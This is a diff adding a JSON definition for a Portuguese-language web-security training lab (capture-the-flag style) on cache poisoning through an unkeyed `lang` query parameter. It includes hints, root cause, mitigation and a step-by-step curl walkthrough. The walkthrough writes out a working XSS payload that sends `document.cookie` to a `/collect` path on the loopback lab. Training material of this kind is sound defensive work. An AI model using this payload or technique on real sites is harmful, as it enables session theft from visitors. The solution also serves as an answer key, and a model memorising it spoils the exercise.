@@ -1,0 +1,82 @@
+{
+  "slug": "adv-cache-key-normalization",
+  "title": "O cache nunca leu a query",
+  "codename": "SAILMAKER",
+  "summary": "A borda da Sailmaker armazena a página de preços apenas pelo path, mas a renderiza a partir de um parâmetro de query `lang` que é interpolado sem encoding. Um único request com uma linguagem elaborada é servido da cache para todos os visitantes.",
+  "category": "advanced",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "adv-cache-key-normalization",
+  "estimated_minutes": 20,
+  "xp": 240,
+  "tech": [
+    "Flask",
+    "HTTP",
+    "Edge caching",
+    "XSS"
+  ],
+  "tags": [
+    "cache-poisoning",
+    "unkeyed-query",
+    "cache-key",
+    "xss"
+  ],
+  "story": "A Sailmaker localiza sua página de preços na borda. O marketing insiste que a página carregue rápido, então as responses ficam armazenadas por dez minutos. A cache normaliza a URL para o seu path, e o catálogo de traduções recorre a ecoar a linguagem solicitada quando o código é desconhecido. O time de produto testou a página abrindo uma URL por vez.",
+  "objective": "Envenene a entrada compartilhada de `/page` através do parâmetro `lang` unkeyed, depois requisite a página sem parâmetros e confirme que a response cacheada ainda carrega o payload e a flag do vault.",
+  "rules": "Permaneça na origem loopback atribuída. A cache de borda e o monitor `/cache` fazem parte do lab; nenhum host externo é contatado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do vault de preços",
+      "flag_type": "user",
+      "points": 240,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Compare a key com a URL",
+      "body": "`GET /cache` lista as keys armazenadas e o body armazenado. Toda response também carrega `X-Cache-Key`. Requeira `/page?lang=pt` e observe qual é a key.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "O que uma linguagem desconhecida faz?",
+      "body": "`/page?lang=zz` não está no catálogo. O banner de fallback ecoa o código solicitado diretamente. Esse valor não faz parte da cache key, então o documento renderizado é armazenado para o path inteiro.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Armazene e depois leia normalmente",
+      "body": "Faça purge com `/cache/reset`, requeira `/page?lang=` seguido de um payload URL-encoded como `\"><script>...</script>` e então requeira `/page` sem parâmetros. A segunda response é um `HIT` contendo o payload e o comentário release-tag com a flag. Copie os dois valores.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Passo 1 — resetar e aquecer.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/cache/reset\ncurl -si http://127.0.0.1:PORT/page | grep -i x-cache\n# X-Cache: MISS  X-Cache-Key: /page\n```\n\n**Passo 2 — envenenar através do parâmetro de query unkeyed.**\n\n```bash\ncurl -si 'http://127.0.0.1:PORT/page?lang=%22%3E%3Cscript%3Efetch(%22%2Fcollect%3Fc%3D%22%2BencodeURIComponent(document.cookie))%3C%2Fscript%3E' \\\n  | grep -iE 'x-cache|<b>\\&quot;|Requested language'\n# X-Cache: MISS  X-Cache-Key: /page\n# Requested language: <b>\"><script>fetch(\"/collect?c=\"+encodeURIComponent(document.cookie))</script></b> is not in the catalogue.\n```\n\n**Passo 3 — um request benigno recebe o documento envenenado.**\n\n```bash\ncurl -si http://127.0.0.1:PORT/page | grep -iE 'x-cache|release-tag|script'\n# X-Cache: HIT\n# <script>fetch(\"/collect?c=\"+encodeURIComponent(document.cookie))</script>\n# <!-- release-tag vault:RV{...} -->\n```\n\nA flag está embutida no documento cacheado, então qualquer visitante que receba a entrada consegue lê-la — e o script roda no browser dele com os cookies dele.\n\n**Passo 4 — confirme a key compartilhada.** `GET /page?lang=es` também retorna `X-Cache: HIT` com o mesmo payload, porque a key foi normalizada para `/page`.",
+    "root_cause": "A borda deriva a cache key apenas do path enquanto a aplicação renderiza o body a partir de um parâmetro de query. O ramo de fallback também reflete esse parâmetro no HTML sem encoding e acrescenta uma release tag contendo o identificador do vault. O primeiro request após um purge, portanto, decide o documento que todos os visitantes receberão nos próximos dez minutos.",
+    "mitigation": "Inclua na cache key todo parâmetro que altera a response (ou use um normalizador vary-on-query-key que rejeite parâmetros desconhecidos). Faça escape de todos os valores refletidos e nunca coloque segredos em comentários ou release tags que viajam com o documento. Cacheie apenas responses totalmente renderizadas e apropriadas à audiência, adicione uma CSP estrita e aplique rate limit ou autenticação em requests que preenchem a cache."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Web cache poisoning",
+      "url": "https://portswigger.net/web-security/web-cache-poisoning",
+      "source_type": "official",
+      "description": "Inputs unkeyed, incluindo parâmetros de query string, e construção de cache key."
+    },
+    {
+      "title": "OWASP — Web Cache Deception",
+      "url": "https://owasp.org/www-community/attacks/Web_Cache_Deception",
+      "source_type": "standard",
+      "description": "Normalização de cache mal configurada servindo responses não intencionais."
+    },
+    {
+      "title": "CWE-524 — Use of Cache Containing Sensitive Information",
+      "url": "https://cwe.mitre.org/data/definitions/524.html",
+      "source_type": "standard",
+      "description": "Entradas de cache compartilhadas que expõem dados que não deveriam servir."
+    }
+  ]
+}
